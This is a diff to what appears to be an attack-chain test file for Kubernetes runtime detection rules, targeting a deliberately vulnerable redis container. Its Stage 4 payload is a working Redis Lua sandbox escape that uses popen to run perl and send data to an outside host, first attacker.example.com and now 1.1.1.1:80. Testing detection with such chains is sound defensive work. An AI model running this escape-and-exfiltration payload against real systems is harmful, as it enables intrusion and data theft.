@@ -24,16 +24,20 @@ metadata:
         the redis pod — the "redis as a pg client" pivot.
 
       Stage 4 (exfil outside cluster): same escape, popen'd command
-        resolves attacker.example.com and connects out to it carrying
-        whatever was extracted earlier.
+        connects out to 1.1.1.1:80 (cloudflare DNS / HTTP responder)
+        carrying whatever was extracted earlier. Real public IP →
+        produces an actual outbound TCP packet that R0011 sees.
 
-    Detection narrative (under shipped cluster defaults):
+    Detection narrative (under network-knob-enabled cluster — see
+    kubescape/values.yaml networkEventsStreaming + R0011.isTriggerAlert
+    in PR #127):
       Stage 1: nothing should fire (legitimate-looking)
       Stage 2: R0001 (new comm), R0010 (sensitive file) fire reliably
       Stage 3: R0001 fires (new comm); the redis→postgres egress is
-               NetworkNeighborhood-novel but R0011 is monitor-only
-      Stage 4: R0001 fires (new comm); the DNS lookup + external egress
-               are BLIND today (networkEventsStreaming=disable)
+               NetworkNeighborhood-novel but R0011 is BLIND-by-design
+               (cluster-internal IP — R0011 filters those out).
+      Stage 4: R0001 fires (new comm); R0011 fires on the outbound
+               TCP to 1.1.1.1:80.
 
     See example/chain/sbobs/ for the actual learned ApplicationProfiles
     and NetworkNeighborhoods that bound which alerts can fire.
@@ -117,15 +121,25 @@ attacks:
       - ruleID: R0011
         ruleName: Unexpected Egress Network Traffic
         containerName: redis
-        # BLIND today: networkEventsStreaming=disable + R0011 monitor-only.
+        # BLIND-by-rule-design: chain-postgres:5432 resolves to a
+        # private cluster IP, and R0011's expression filters those
+        # out (`!net.is_private_ip(event.dstAddr)`). The rule targets
+        # *external* exfil — s4 exercises it. (Network knobs are
+        # flipped in PR #127; this BLIND now reflects rule intent
+        # rather than missing config.)
 
   # ─── Stage 4 ─── Exfil (data leaves the cluster via perl) ────────────
   # Same escape, popen perl with IO::Socket::INET to open TCP to an
   # external host. perl is NOT in redis's profile → R0001 fires.
-  # The DNS lookup of attacker.example.com would fire R0005 and the TCP
-  # egress would fire R0011 — both BLIND today. (perl is preferred over
-  # wget/curl because the redis-vulnerable image ships perl but not
-  # wget/curl/nc — see example/chain/sbobs/ap-chain-redis.yaml.)
+  # Targets 1.1.1.1:80 (cloudflare's public DNS resolver also
+  # responds on HTTP/80 with a redirect) — a real, reachable public
+  # IP that produces an actual outbound TCP packet so R0011 has
+  # something to fire on. R0005 fires from the DNS lookup of any
+  # name that does resolve; targeting an IP directly skips the DNS
+  # phase here (s6 handles the DNS-anomaly leg via nip.io chunks).
+  # (perl is preferred over wget/curl because the redis-vulnerable
+  # image ships perl but not wget/curl/nc — see
+  # example/chain/sbobs/ap-chain-redis.yaml.)
   - name: s4-exfil-to-internet
     type: exfil
     http:
@@ -134,7 +148,7 @@ attacks:
       headers:
         Content-Type: application/json
       body: |
-        {"script":"local io_mod=nil; pcall(function() if type(io)=='table' and io.popen then io_mod=io end end); if not io_mod then pcall(function() local L=package.loadlib('/usr/lib/liblua5.1.so.0','luaopen_io'); if L then io_mod=L() end end); end; if not io_mod then return 'sandbox_blocked' end; local h=io_mod.popen(\"perl -e 'use IO::Socket::INET; my $s=IO::Socket::INET->new(PeerAddr=>q{attacker.example.com:80},Timeout=>2); print $s qq{GET /?d=loot HTTP/1.0\\\\nHost:x\\\\n\\\\n} if $s; close $s if $s; print qq{done}' 2>&1\"); local out=h:read('*a'); h:close(); return out"}
+        {"script":"local io_mod=nil; pcall(function() if type(io)=='table' and io.popen then io_mod=io end end); if not io_mod then pcall(function() local L=package.loadlib('/usr/lib/liblua5.1.so.0','luaopen_io'); if L then io_mod=L() end end); end; if not io_mod then return 'sandbox_blocked' end; local h=io_mod.popen(\"perl -e 'use IO::Socket::INET; my $s=IO::Socket::INET->new(PeerAddr=>q{1.1.1.1:80},Timeout=>2); print $s qq{GET /?d=loot HTTP/1.0\\\\nHost:x\\\\n\\\\n} if $s; close $s if $s; print qq{done}' 2>&1\"); local out=h:read('*a'); h:close(); return out"}
     successIndicators:
       - statusCode: 200
     expectedDetections:
@@ -142,11 +156,12 @@ attacks:
         ruleName: Unexpected process launched
         containerName: redis
         command: perl
-      - ruleID: R0005
-        ruleName: DNS Anomalies in container
-        containerName: redis
-        # BLIND today: networkEventsStreaming=disable.
       - ruleID: R0011
         ruleName: Unexpected Egress Network Traffic
         containerName: redis
-        # BLIND today: networkEventsStreaming=disable + R0011 monitor-only.
+        # Fires now that PeerAddr=1.1.1.1 — a real public IP that
+        # produces an outbound TCP SYN. (Previously target was
+        # attacker.example.com which is NXDOMAIN, so no connection
+        # was actually attempted.) No R0005 here: perl skips DNS
+        # when PeerAddr is already an IP — the DNS-anomaly path is
+        # exercised in s6 instead.
